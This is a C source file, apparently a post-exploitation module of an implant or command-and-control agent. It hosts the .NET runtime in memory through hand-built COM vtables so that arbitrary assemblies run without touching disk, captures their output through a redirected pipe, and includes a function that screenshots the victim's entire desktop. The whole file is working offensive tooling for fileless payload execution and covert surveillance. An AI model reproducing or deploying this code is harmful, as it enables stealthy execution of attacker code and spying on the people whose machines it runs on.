/**
 * exec_clr.c - In-process .NET CLR hosting (raw COM vtables, no disk drop)
 */
#include <windows.h>
#include <stdio.h>
#include <objbase.h>
#include <oleauto.h>
#include "../../include/postex.h"

/* mscoree.h subset - avoid SDK dependency */
static const GUID CLSID_CLRMetaHost =
    {0x9280188d,0x0e8e,0x4867,{0xb3,0x0c,0x7f,0xa8,0x38,0xae,0x84,0xbe}};
static const GUID IID_ICLRMetaHost =
    {0xD332DB9E,0xB9B3,0x4125,{0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
static const GUID IID_ICLRRuntimeInfo =
    {0xBD39D1D2,0xBA2F,0x486C,{0xBF,0x89,0xB4,0xB0,0xCB,0x46,0x6C,0x51}};
static const GUID CLSID_CorRuntimeHost =
    {0xCB2F6723,0xAB3A,0x11D2,{0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x66}};
static const GUID IID_ICorRuntimeHost =
    {0xCB2F6722,0xAB3A,0x11D2,{0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x66}};
static const GUID IID__AppDomain =
    {0x05F696DC,0x2B29,0x3663,{0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13}};
static const GUID IID__Assembly =
    {0x17156396,0xC214,0x4999,{0xBC,0x17,0xC5,0x46,0x7D,0xAE,0xA3,0x43}};
static const GUID IID__MethodInfo =
    {0xFFCC1B5D,0xECB8,0x38DD,{0x9B,0x45,0x35,0x0C,0x21,0x88,0x16,0x98}};

typedef HRESULT (WINAPI *CLRCreateInstance_t)(REFCLSID, REFIID, LPVOID *);

typedef struct ICLRMetaHostVtbl ICLRMetaHostVtbl;
typedef struct ICLRMetaHost {
    ICLRMetaHostVtbl *lpVtbl;
} ICLRMetaHost;

typedef struct ICLRMetaHostVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICLRMetaHost*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICLRMetaHost*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICLRMetaHost*);
    HRESULT (STDMETHODCALLTYPE *GetRuntime)(ICLRMetaHost*, LPCWSTR, REFIID, LPVOID*);
    HRESULT (STDMETHODCALLTYPE *GetVersionFromFile)(ICLRMetaHost*, LPCWSTR, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *EnumerateInstalledRuntimes)(ICLRMetaHost*, IEnumUnknown**);
    HRESULT (STDMETHODCALLTYPE *EnumerateLoadedRuntimes)(ICLRMetaHost*, HANDLE, IEnumUnknown**);
    HRESULT (STDMETHODCALLTYPE *RequestRuntimeLoadedNotification)(ICLRMetaHost*, void*);
    HRESULT (STDMETHODCALLTYPE *QueryLegacyV2RuntimeBinding)(ICLRMetaHost*, REFIID, LPVOID*);
    HRESULT (STDMETHODCALLTYPE *ExitProcess)(ICLRMetaHost*, INT32);
} ICLRMetaHostVtbl;

typedef struct ICLRRuntimeInfoVtbl ICLRRuntimeInfoVtbl;
typedef struct ICLRRuntimeInfo {
    ICLRRuntimeInfoVtbl *lpVtbl;
} ICLRRuntimeInfo;

typedef struct ICLRRuntimeInfoVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICLRRuntimeInfo*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICLRRuntimeInfo*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICLRRuntimeInfo*);
    HRESULT (STDMETHODCALLTYPE *GetVersionString)(ICLRRuntimeInfo*, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *GetRuntimeDirectory)(ICLRRuntimeInfo*, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *IsLoaded)(ICLRRuntimeInfo*, HANDLE, BOOL*);
    HRESULT (STDMETHODCALLTYPE *LoadErrorString)(ICLRRuntimeInfo*, UINT, LPWSTR, DWORD*, LONG);
    HRESULT (STDMETHODCALLTYPE *LoadLibrary)(ICLRRuntimeInfo*, LPCWSTR, HMODULE*);
    HRESULT (STDMETHODCALLTYPE *GetProcAddress)(ICLRRuntimeInfo*, LPCSTR, LPVOID*);
    HRESULT (STDMETHODCALLTYPE *GetInterface)(ICLRRuntimeInfo*, REFCLSID, REFIID, LPVOID*);
    HRESULT (STDMETHODCALLTYPE *IsLoadable)(ICLRRuntimeInfo*, BOOL*);
    HRESULT (STDMETHODCALLTYPE *SetDefaultStartupFlags)(ICLRRuntimeInfo*, DWORD, LPCWSTR);
    HRESULT (STDMETHODCALLTYPE *GetDefaultStartupFlags)(ICLRRuntimeInfo*, DWORD*, LPWSTR, DWORD*);
    HRESULT (STDMETHODCALLTYPE *BindAsLegacyV2Runtime)(ICLRRuntimeInfo*);
    HRESULT (STDMETHODCALLTYPE *IsStarted)(ICLRRuntimeInfo*, BOOL*, DWORD*);
} ICLRRuntimeInfoVtbl;

typedef struct ICorRuntimeHostVtbl ICorRuntimeHostVtbl;
typedef struct ICorRuntimeHost {
    ICorRuntimeHostVtbl *lpVtbl;
} ICorRuntimeHost;

typedef struct ICorRuntimeHostVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICorRuntimeHost*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICorRuntimeHost*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *CreateLogicalThreadState)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *DeleteLogicalThreadState)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *SwitchInLogicalThreadState)(ICorRuntimeHost*, DWORD*);
    HRESULT (STDMETHODCALLTYPE *SwitchOutLogicalThreadState)(ICorRuntimeHost*, DWORD**);
    HRESULT (STDMETHODCALLTYPE *LocksHeldByLogicalThread)(ICorRuntimeHost*, DWORD*);
    HRESULT (STDMETHODCALLTYPE *MapFile)(ICorRuntimeHost*, HANDLE, HMODULE*);
    HRESULT (STDMETHODCALLTYPE *GetConfiguration)(ICorRuntimeHost*, void**);
    HRESULT (STDMETHODCALLTYPE *Start)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *Stop)(ICorRuntimeHost*);
    HRESULT (STDMETHODCALLTYPE *CreateDomain)(ICorRuntimeHost*, LPCWSTR, IUnknown*, IUnknown**);
    HRESULT (STDMETHODCALLTYPE *GetDefaultDomain)(ICorRuntimeHost*, IUnknown**);
    HRESULT (STDMETHODCALLTYPE *EnumDomains)(ICorRuntimeHost*, void**);
    HRESULT (STDMETHODCALLTYPE *NextDomain)(ICorRuntimeHost*, void*, IUnknown**);
    HRESULT (STDMETHODCALLTYPE *CloseEnum)(ICorRuntimeHost*, void*);
    HRESULT (STDMETHODCALLTYPE *CreateDomainEx)(ICorRuntimeHost*, LPCWSTR, IUnknown*, void*, IUnknown**);
    HRESULT (STDMETHODCALLTYPE *CreateDomainSetup)(ICorRuntimeHost*, IUnknown**);
    HRESULT (STDMETHODCALLTYPE *CreateEvidence)(ICorRuntimeHost*, IUnknown**);
    HRESULT (STDMETHODCALLTYPE *UnloadDomain)(ICorRuntimeHost*, IUnknown*);
    HRESULT (STDMETHODCALLTYPE *CurrentDomain)(ICorRuntimeHost*, IUnknown**);
} ICorRuntimeHostVtbl;

typedef struct { void **lpVtbl; } _AppDomain;
typedef struct { void **lpVtbl; } _Assembly;
typedef struct { void **lpVtbl; } _MethodInfo;

typedef HRESULT (STDMETHODCALLTYPE *AppDomain_Load_3_t)(_AppDomain*, SAFEARRAY*, _Assembly**);
typedef HRESULT (STDMETHODCALLTYPE *Assembly_get_EntryPoint_t)(_Assembly*, _MethodInfo**);
typedef HRESULT (STDMETHODCALLTYPE *MethodInfo_Invoke_3_t)(_MethodInfo*, VARIANT, SAFEARRAY*, VARIANT*);

#define APPDOMAIN_LOAD_3_VTIDX       45
#define ASSEMBLY_ENTRYPOINT_VTIDX    16
#define METHODINFO_INVOKE_3_VTIDX    37

static CRITICAL_SECTION g_clr_lock;
static volatile LONG g_clr_lock_init = 0;

static BOOL ensure_clr_lock(void) {
    if (InterlockedCompareExchange(&g_clr_lock_init, 1, 0) == 0)
        InitializeCriticalSection(&g_clr_lock);
    return TRUE;
}

static BOOL read_pipe_output(HANDLE hRead, PBYTE *output, PDWORD output_size) {
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 65536);
    if (!buf) return FALSE;
    DWORD total = 0, n = 0;
    while (ReadFile(hRead, buf + total, 65536 - total - 1, &n, NULL) && n > 0) {
        total += n;
        if (total >= 65534) break;
    }
    buf[total] = 0;
    *output = buf;
    *output_size = total;
    return TRUE;
}

static HRESULT clr_load_assembly_bytes(PBYTE assembly, DWORD assembly_size, const char *args,
                                       ICorRuntimeHost *cor_host) {
    IUnknown *domain_unk = NULL;
    _AppDomain *domain = NULL;
    _Assembly *asm_obj = NULL;
    _MethodInfo *entry = NULL;
    SAFEARRAY *sa = NULL;
    SAFEARRAY *invoke_args = NULL;
    HRESULT hr;

    hr = cor_host->lpVtbl->GetDefaultDomain(cor_host, &domain_unk);
    if (FAILED(hr) || !domain_unk)
        return hr;

    hr = domain_unk->lpVtbl->QueryInterface(domain_unk, &IID__AppDomain, (void **)&domain);
    domain_unk->lpVtbl->Release(domain_unk);
    if (FAILED(hr) || !domain)
        return hr;

    {
        SAFEARRAYBOUND bound = {assembly_size, 0};
        sa = SafeArrayCreate(VT_UI1, 1, &bound);
        if (!sa) {
            hr = E_OUTOFMEMORY;
            goto cleanup;
        }
        {
            void *data = NULL;
            if (FAILED(SafeArrayAccessData(sa, &data))) {
                hr = E_FAIL;
                goto cleanup;
            }
            CopyMemory(data, assembly, assembly_size);
            SafeArrayUnaccessData(sa);
        }
    }

    {
        AppDomain_Load_3_t pLoad = (AppDomain_Load_3_t)(*(void ***)domain)[APPDOMAIN_LOAD_3_VTIDX];
        hr = pLoad(domain, sa, &asm_obj);
    }
    if (FAILED(hr) || !asm_obj)
        goto cleanup;

    {
        Assembly_get_EntryPoint_t pEntry = (Assembly_get_EntryPoint_t)(*(void ***)asm_obj)[ASSEMBLY_ENTRYPOINT_VTIDX];
        hr = pEntry(asm_obj, &entry);
    }
    if (FAILED(hr) || !entry)
        goto cleanup;

    {
        VARIANT obj, ret;
        VariantInit(&obj);
        VariantInit(&ret);
        obj.vt = VT_NULL;

        {
            SAFEARRAYBOUND ab = {1, 0};
            invoke_args = SafeArrayCreate(VT_VARIANT, 1, &ab);
            if (invoke_args) {
                LONG idx = 0;
                VARIANT arg;
                VariantInit(&arg);
                if (args && args[0]) {
                    arg.vt = VT_BSTR;
                    arg.bstrVal = SysAllocStringByteLen(args, (UINT)lstrlenA(args));
                } else {
                    arg.vt = VT_ARRAY | VT_BSTR;
                    arg.parray = SafeArrayCreateVector(VT_BSTR, 0, 0);
                }
                SafeArrayPutElement(invoke_args, &idx, &arg);
                VariantClear(&arg);
            }
        }

        {
            MethodInfo_Invoke_3_t pInvoke = (MethodInfo_Invoke_3_t)(*(void ***)entry)[METHODINFO_INVOKE_3_VTIDX];
            hr = pInvoke(entry, obj, invoke_args, &ret);
        }
        VariantClear(&ret);
    }

cleanup:
    if (entry)
        ((IUnknown *)entry)->lpVtbl->Release((IUnknown *)entry);
    if (asm_obj)
        ((IUnknown *)asm_obj)->lpVtbl->Release((IUnknown *)asm_obj);
    if (domain)
        ((IUnknown *)domain)->lpVtbl->Release((IUnknown *)domain);
    if (sa)
        SafeArrayDestroy(sa);
    if (invoke_args)
        SafeArrayDestroy(invoke_args);
    return hr;
}

BOOL exec_assembly(PBYTE assembly, DWORD assembly_size, const char *args,
                   PBYTE *output, PDWORD output_size) {
    if (!assembly || assembly_size == 0) return FALSE;

    ensure_clr_lock();
    EnterCriticalSection(&g_clr_lock);

    HANDLE hOldOut = NULL;
    HANDLE hOldErr = NULL;
    HANDLE hRead = NULL;
    HANDLE hWrite = NULL;
    HRESULT hr = E_FAIL;

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    CreatePipe(&hRead, &hWrite, &sa, 0);
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    hOldOut = GetStdHandle(STD_OUTPUT_HANDLE);
    hOldErr = GetStdHandle(STD_ERROR_HANDLE);
    SetStdHandle(STD_OUTPUT_HANDLE, hWrite);
    SetStdHandle(STD_ERROR_HANDLE, hWrite);

    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
    if (!hMscoree) goto cleanup;

    CLRCreateInstance_t pCLRCreateInstance =
        (CLRCreateInstance_t)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!pCLRCreateInstance) goto cleanup;

    ICLRMetaHost *meta = NULL;
    if (FAILED(pCLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, (LPVOID *)&meta)))
        goto cleanup;

    ICLRRuntimeInfo *runtime = NULL;
    if (FAILED(meta->lpVtbl->GetRuntime(meta, L"v4.0.30319", &IID_ICLRRuntimeInfo, (LPVOID *)&runtime))) {
        meta->lpVtbl->Release(meta);
        goto cleanup;
    }

    ICorRuntimeHost *cor_host = NULL;
    if (FAILED(runtime->lpVtbl->GetInterface(runtime, &CLSID_CorRuntimeHost,
                                             &IID_ICorRuntimeHost, (LPVOID *)&cor_host))) {
        runtime->lpVtbl->Release(runtime);
        meta->lpVtbl->Release(meta);
        goto cleanup;
    }

    cor_host->lpVtbl->Start(cor_host);
    hr = clr_load_assembly_bytes(assembly, assembly_size, args, cor_host);
    cor_host->lpVtbl->Stop(cor_host);
    cor_host->lpVtbl->Release(cor_host);
    runtime->lpVtbl->Release(runtime);
    meta->lpVtbl->Release(meta);

    FlushFileBuffers(hWrite);
    CloseHandle(hWrite);
    hWrite = NULL;
    SetStdHandle(STD_OUTPUT_HANDLE, hOldOut);
    SetStdHandle(STD_ERROR_HANDLE, hOldErr);

    if (output && output_size)
        read_pipe_output(hRead, output, output_size);

    if (hRead) CloseHandle(hRead);
    LeaveCriticalSection(&g_clr_lock);
    return SUCCEEDED(hr);

cleanup:
    if (hWrite) {
        CloseHandle(hWrite);
        SetStdHandle(STD_OUTPUT_HANDLE, hOldOut);
        SetStdHandle(STD_ERROR_HANDLE, hOldErr);
    }
    if (hRead) CloseHandle(hRead);
    LeaveCriticalSection(&g_clr_lock);
    return FALSE;
}

BOOL collect_screenshot(PBYTE *output, PDWORD output_size) {
    int sx = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int sy = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int sw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int sh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (sw <= 0 || sh <= 0) {
        sw = GetSystemMetrics(SM_CXSCREEN);
        sh = GetSystemMetrics(SM_CYSCREEN);
        sx = sy = 0;
    }

    HDC hScreen = GetDC(NULL);
    if (!hScreen) return FALSE;

    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, sw, sh);
    if (!hMem || !hBmp) {
        if (hBmp) DeleteObject(hBmp);
        if (hMem) DeleteDC(hMem);
        ReleaseDC(NULL, hScreen);
        return FALSE;
    }

    HGDIOBJ old = SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, sw, sh, hScreen, sx, sy, SRCCOPY);
    SelectObject(hMem, old);

    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.biSize = sizeof(bi);
    bi.biWidth = sw;
    bi.biHeight = -sh;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    DWORD row = ((sw * 3 + 3) & ~3);
    DWORD pix_size = row * sh;
    DWORD file_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + pix_size;

    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, file_size);
    if (!buf) {
        DeleteObject(hBmp);
        DeleteDC(hMem);
        ReleaseDC(NULL, hScreen);
        return FALSE;
    }

    BITMAPFILEHEADER *bfh = (BITMAPFILEHEADER *)buf;
    bfh->bfType = 0x4D42;
    bfh->bfSize = file_size;
    bfh->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    CopyMemory(buf + sizeof(BITMAPFILEHEADER), &bi, sizeof(bi));

    if (!GetDIBits(hMem, hBmp, 0, sh,
                   buf + bfh->bfOffBits, (BITMAPINFO *)&bi, DIB_RGB_COLORS)) {
        HeapFree(GetProcessHeap(), 0, buf);
        DeleteObject(hBmp);
        DeleteDC(hMem);
        ReleaseDC(NULL, hScreen);
        return FALSE;
    }

    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);

    *output = buf;
    *output_size = file_size;
    return TRUE;
}
